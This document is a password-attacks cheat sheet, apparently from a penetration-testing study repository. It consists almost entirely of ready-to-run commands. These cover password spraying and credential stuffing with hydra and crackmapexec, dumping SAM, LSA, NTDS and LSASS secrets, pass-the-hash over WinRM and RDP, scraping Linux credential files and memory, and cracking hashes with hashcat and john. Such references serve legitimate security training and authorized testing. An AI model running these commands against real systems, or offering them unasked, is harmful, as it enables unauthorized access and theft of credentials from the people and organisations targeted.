# Password Attacks Cheat Sheet

Flat copy-paste reference (explanations in `10-password-attacks/README.md`).
Placeholders: `<TARGET_IP>`, `<LHOST>`, `<USER>`, `<PASS>`, `<DOMAIN>`, `<HASH>`.

## Default / reused creds (try first)
```bash
creds search mssql                        # DefaultCreds-Cheat-Sheet DB (by product)
# also CIRT.net; always test any found password for reuse across hosts/services
```

## Wordlist generation
```bash
cewl https://<site> -d 4 -m 6 --lowercase -w site.wordlist      # scrape words from a site
hashcat --force base.list -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.list
username-anarchy -i firstlast.txt                                # username formats
```

## Remote password attacks
```bash
crackmapexec winrm <TARGET_IP> -u users.txt -p pass.txt          # spray WinRM
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares        # test + enum shares
hydra -L users.txt -P pass.txt <service>://<TARGET_IP>
hydra -C user_pass.txt ssh://<TARGET_IP>                         # credential stuffing (combined list)
# dump hashes with valid creds:
crackmapexec smb <TARGET_IP> --local-auth -u <USER> -p <PASS> --sam      # local SAM
crackmapexec smb <TARGET_IP> --local-auth -u <USER> -p <PASS> --lsa      # LSA secrets
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --ntds                  # domain NTDS (DA)
evil-winrm -i <TARGET_IP> -u Administrator -H "<HASH>"                    # Pass-the-Hash (WinRM)
# PtH over RDP (enable Restricted Admin first):
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<HASH>
```

## Windows local credential looting
```text
findstr /SIM /C:"password" *.txt *.ini *.config *.xml *.ps1 *.yml
# LSASS dump → extract offline:
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full
pypykatz lsa minidump lsass.dmp
# SAM/SYSTEM:
reg save HKLM\SAM sam.save ; reg save HKLM\SYSTEM system.save
secretsdump.py -sam sam.save -system system.save LOCAL
# NTDS.dit via shadow copy (on a DC):
vssadmin create shadow /for=C:   →  copy ...\Windows\NTDS\NTDS.dit  →  secretsdump.py -ntds ...
```

## Linux local credential looting
```bash
find / -name "*.cnf" -o -name "*.conf" 2>/dev/null | xargs grep -iE "user|pass" 2>/dev/null
grep -rnw "PRIVATE KEY" / 2>/dev/null          # SSH private keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null         # authorized_keys / pubkeys
tail -n5 /home/*/.bash*                          # history
cat /etc/crontab ; ls -la /etc/cron.*/           # creds in scheduled jobs
./mimipenguin.sh                                 # scrape creds from memory (root)
python3 lazagne.py all                           # stored creds from many apps
cat ~/.mozilla/firefox/*.default-release/logins.json | jq .   # then firefox_decrypt.py
```

## Cracking (hashcat modes)
```bash
hashcat -m 1000 ntlm.txt rockyou.txt             # NTLM
hashcat -m 1800 -a 0 unshadowed.txt rockyou.txt  # Linux sha512crypt
hashcat -m 500  md5crypt.txt rockyou.txt         # md5crypt
hashcat -m 22100 backup.hash rockyou.txt         # BitLocker
hashcat -m 13100 tgs.hash rockyou.txt            # Kerberoast TGS
hashcat -m 18200 asrep.hash rockyou.txt          # AS-REP
hashcat -m 5600 ntlmv2.hash rockyou.txt          # NetNTLMv2
hashcat -m 13400 keepass.hash rockyou.txt        # KeePass
# append --show to print cracked results from the potfile
unshadow /etc/passwd /etc/shadow > unshadowed.txt
# *2john extractors → john/hashcat the output:
ssh2john id_rsa > h ; office2john doc.docx > h ; zip2john f.zip > h ; pdf2john.pl f.pdf > h ; bitlocker2john -i disk.vhd > h
john --wordlist=rockyou.txt h
```

> Flow: loot hashes → identify type (`hashid`) → pick the right `-m` mode → crack with rockyou + rules. Credential reuse across hosts is what turns one cracked hash into the whole network. (AD-specific Kerberoast/AS-REP/DCSync commands live in `active-directory.md`.)
